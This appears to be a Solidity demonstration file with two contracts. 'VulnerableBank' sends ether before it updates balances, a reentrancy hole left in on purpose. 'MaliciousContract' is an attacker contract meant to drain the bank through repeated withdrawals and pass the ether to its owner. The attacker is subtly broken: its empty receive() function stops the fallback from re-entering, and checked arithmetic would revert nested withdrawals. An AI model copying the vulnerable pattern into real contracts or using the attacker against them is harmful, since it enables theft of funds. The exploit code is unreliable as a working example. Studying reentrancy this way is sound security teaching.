// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        require(msg.value > 0, "Deposit amount must be greater than zero");
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) public {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        // Vulnerable: Interactions before Effects
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Withdrawal failed");

        // Effects: Update the user's balance
        balances[msg.sender] -= amount;
    }
}

contract MaliciousContract {
    VulnerableBank public vulnerableBank;
    address public owner;

    constructor(address _vulnerableBank) {
        vulnerableBank = VulnerableBank(_vulnerableBank);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 0, "Deposit amount must be greater than zero");
        vulnerableBank.deposit{value: msg.value}();
        vulnerableBank.withdraw(msg.value);
    }

    receive() external payable {
    }

    fallback() external payable {
        if (address(vulnerableBank).balance >= msg.value) {
            vulnerableBank.withdraw(msg.value);
        }
    }

    function collectEther() public {
        require(msg.sender == owner, "Only the owner can collect Ether");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}
